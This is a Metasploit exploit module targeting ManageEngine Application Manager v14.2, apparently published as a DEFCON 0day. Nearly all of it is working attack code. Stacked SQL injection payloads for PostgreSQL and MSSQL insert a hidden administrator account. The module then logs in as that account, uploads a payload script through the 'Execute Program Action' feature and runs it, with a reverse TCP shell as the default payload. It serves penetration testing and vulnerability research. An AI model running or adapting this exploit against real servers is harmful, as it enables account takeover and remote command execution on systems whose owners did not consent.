# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ManageEngine Application Manager v14.2 - Privilege Escalation / Remote Command Execution",
      &#039;Description&#039;    => %q(
        This module exploits sqli and command injection vulnerability in the ME Application Manager v14.2 and prior versions.
 
        Module creates a new admin user with SQLi (MSSQL/PostgreSQL) and provides privilege escalation.
        Therefore low authority user can gain the authority of "system" on the server. 
        It uploads malicious file using the "Execute Program Action(s)" feature of Application Manager.

        /////// This 0day has been published at DEFCON-AppSec Village. ///////

      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module @ehakkus
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://pentest.com.tr/exploits/DEFCON-ManageEngine-APM-v14-Privilege-Escalation-Remote-Command-Execution.html&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 60,
          &#039;RPORT&#039; => 9090,
          &#039;SSL&#039; => false,
          &#039;PAYLOAD&#039; => &#039;generic/shell_reverse_tcp&#039;
        },
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;win&#039;],
      &#039;Targets&#039; =>
        [
          [ &#039;Windows Target&#039;,
            {
              &#039;Platform&#039; => [&#039;win&#039;],
              &#039;Arch&#039; => ARCH_CMD,
            }
          ],
          [ &#039;Linux Target&#039;,
            {
              &#039;Platform&#039; => [&#039;unix&#039;],
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Payload&#039; =>
                {
                  &#039;Compat&#039; =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                    }
                }
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;10 August 2019 //DEFCON&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;OpManager Username&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;OpManager Password&#039;]),
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;Base path for ME application&#039;, &#039;/&#039;])
      ],self.class)
  end

  def check_platform(cookie)

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;showTile.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_get&#039; => {
        &#039;TileName&#039; => &#039;.ExecProg&#039;,
        &#039;haid&#039; => &#039;null&#039;,
      }
    )
    if res && res.code == 200 && res.body.include?(&#039;createExecProgAction&#039;)
      @dir = res.body.split(&#039;name="execProgExecDir" maxlength="200" size="40" value="&#039;)[1].split(&#039;" class=&#039;)[0]
      if @dir =~ /:/
        platform = Msf::Module::Platform::Windows
      else 
        platform = Msf::Module::Platform::Unix
      end
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred! DIR could not be detected.&#039;)
    end
    file_up(cookie, platform, @dir)
  end

  def file_up(cookie, platform, dir)
    if platform == Msf::Module::Platform::Windows
      filex = ".bat"
    else
      if payload.encoded =~ /sh/
        filex = ".sh"
      elsif payload.encoded =~ /perl/
        filex = ".pl"
      elsif payload.encoded =~ /awk &#039;BEGIN{/
        filex = ".sh"
      elsif payload.encoded =~ /python/
        filex = ".py"
      elsif payload.encoded =~ /ruby/
        filex = ".rb"
      else
        fail_with(Failure::Unknown, &#039;Payload type could not be checked!&#039;)
      end
    end
 
    @fname= rand_text_alpha(9 + rand(3)) + filex
    data = Rex::MIME::Message.new
    data.add_part(&#039;./&#039;, nil, nil, &#039;form-data; name="uploadDir"&#039;)
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"theFile\"; filename=\"#{@fname}\"")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data.to_s,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri, "Upload.do")     
    })
 
    if res && res.code == 200 && res.body.include?(&#039;icon_message_success&#039;)
      print_good("#{@fname} malicious file has been uploaded.")
      create_exec_prog(cookie, dir, @fname)
    else
      fail_with(Failure::Unknown, &#039;The file could not be uploaded!&#039;)
    end
  end

  def create_exec_prog(cookie, dir, fname)
 
    @display = rand_text_alphanumeric(7)
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;adminAction.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_post&#039; => {
        &#039;actions&#039; => &#039;/showTile.do?TileName=.ExecProg&haid=null&#039;,
        &#039;method&#039; => &#039;createExecProgAction&#039;,
        &#039;id&#039; => 0,
        &#039;displayname&#039; => @display,
        &#039;serversite&#039; => &#039;local&#039;,
        &#039;choosehost&#039; => -2,
        &#039;abortafter&#039; => 5,
        &#039;command&#039; => fname,
        &#039;execProgExecDir&#039; => dir,
        &#039;cancel&#039; => &#039;false&#039;
      }
    )
 
    if res && res.code == 200 && res.body.include?(&#039;icon_message_success&#039;)
      actionid = res.body.split(&#039;actionid=&#039;)[1].split("&#039;,&#039;710&#039;,&#039;350&#039;,&#039;250&#039;,&#039;200&#039;)")[0] 
      print_status("Transactions completed. Attempting to get a session...")
      exec(cookie, actionid)
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred!&#039;)
    end
  end

  def exec(cookie, action)
    send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;common&#039;, &#039;executeScript.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_get&#039; => {
        &#039;method&#039; => &#039;testAction&#039;,
        &#039;actionID&#039; => action,
        &#039;haid&#039; => &#039;null&#039;
      }
    )
  end
 
  def peer
    "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
  end
 
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_good(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end 

  def check

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;index.do&#039;),
    )
    # For this part the build control will be placed.
    if res && res.code == 200 && res.body.include?(&#039;Build No:142&#039;)
      return Exploit::CheckCode::Vulnerable
    else 
      return Exploit::CheckCode::Safe
    end
  end

  def app_login

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
    )

    if res && res.code == 200 && res.body.include?(&#039;.loginDiv&#039;)
      @cookie = res.get_cookies

      res = send_request_cgi(
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;cookie&#039;   => @cookie,
        &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;/j_security_check&#039;),
        &#039;vars_post&#039; => {
          &#039;clienttype&#039; => &#039;html&#039;,
          &#039;j_username&#039; => datastore[&#039;USERNAME&#039;],
          &#039;j_password&#039; => datastore[&#039;PASSWORD&#039;],
          &#039;submit&#039; => &#039;Login&#039;
        }
      )

      if res && res.code == 303
        res = send_request_cgi(
          &#039;cookie&#039;  => @cookie,
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
        )

        @cookie = res.get_cookies
        send_sqli(@cookie)
      else
        fail_with(Failure::NotVulnerable, &#039;Failed to perform privilege escalation!&#039;)
      end     

    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred! User information is incorrect.&#039;)
    end
  end

  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end
    app_login
  end

  def send_sqli(cookies)

    @uname = Rex::Text.rand_text_alpha_lower(6)
    uid = rand_text_numeric(3)
    apk = rand_text_numeric(6) 
    @pwd = rand_text_alphanumeric(8+rand(9))
    @uidCHR = "#{uid.unpack(&#039;c*&#039;).map{|c| "CHAR(#{c})" }.join(&#039;+&#039;)}"
    @unameCHR = "#{@uname.unpack(&#039;c*&#039;).map{|c| "CHAR(#{c})" }.join(&#039;+&#039;)}"
    @apkCHR = "#{apk.unpack(&#039;c*&#039;).map{|c| "CHAR(#{c})" }.join(&#039;+&#039;)}"
    @adm = "CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)"
    pg_user ="" 
    pg_user << "1;insert+into+AM_UserPasswordTable+(userid,username,password)+values+"
    pg_user << "($$#{uid}$$,$$#{@uname}$$,$$#{Rex::Text.md5(@pwd)}$$);"
    pg_user << "insert+into+Am_UserGroupTable+(username,groupname)+values+($$#{@uname}$$,$$ADMIN$$);--+"
    ms_user =""
    ms_user << "1 INSERT INTO AM_UserPasswordTable(userid,username,password,apikey) values (#{@uidCHR},"
    ms_user << " #{@unameCHR}, 0x#{Rex::Text.md5(@pwd)}, #{@apkCHR});"
    ms_user << "INSERT INTO AM_UserGroupTable(username,groupname) values (#{@unameCHR}, #{@adm})--"

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;/jsp/NewThresholdConfiguration.jsp?resourceid=&#039; + pg_user + &#039;&attributeIDs=17,18&attributeToSelect=18&#039;),
      &#039;cookie&#039;   => cookies
    )

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;/jsp/NewThresholdConfiguration.jsp?resourceid=&#039; + ms_user + &#039;&attributeIDs=17,18&attributeToSelect=18&#039;),
      &#039;cookie&#039;   => cookies
    )

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
    )

    if res && res.code == 200 && res.body.include?(&#039;.loginDiv&#039;)
      @cookie = res.get_cookies

      res = send_request_cgi(
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;cookie&#039;   => @cookie,
        &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;/j_security_check&#039;),
        &#039;vars_post&#039; => {
          &#039;clienttype&#039; => &#039;html&#039;,
          &#039;j_username&#039; => @uname,
          &#039;j_password&#039; => @pwd,
          &#039;submit&#039; => &#039;Login&#039;
        }
      )
      print @uname + "//" + @pwd
      puts res.body
      if res && res.code == 303
        print_good("Privilege Escalation was successfully performed.")
        print_good("New APM admin username = " + @uname)
        print_good("New APM admin password = " + @pwd)
        res = send_request_cgi(
          &#039;cookie&#039;  => @cookie,
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
        )

        @cookie = res.get_cookies
        check_platform(@cookie)
      else
        fail_with(Failure::NotVulnerable, &#039;Failed to perform privilege escalation!&#039;)
      end
    else
      fail_with(Failure::NotVulnerable, &#039;Something went wrong!&#039;)
    end
  end
end

